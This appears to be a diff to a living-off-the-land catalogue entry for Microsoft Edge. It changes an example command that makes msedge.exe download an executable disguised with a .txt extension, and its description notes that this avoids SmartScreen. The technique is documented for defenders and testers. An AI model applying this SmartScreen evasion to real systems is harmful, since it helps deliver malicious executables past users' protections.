@@ -4,7 +4,7 @@ Description: Microsoft Edge browser
 Author: 'mr.d0x'
 Created: 2022-01-20
 Commands:
-  - Command: msedge.exe https://example.com/file.exe.zip
+  - Command: msedge.exe https://example.com/file.exe.txt
     Description: Edge will launch and install the file. A harmless file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.
     Usecase: Download file from Internet
     Category: Download
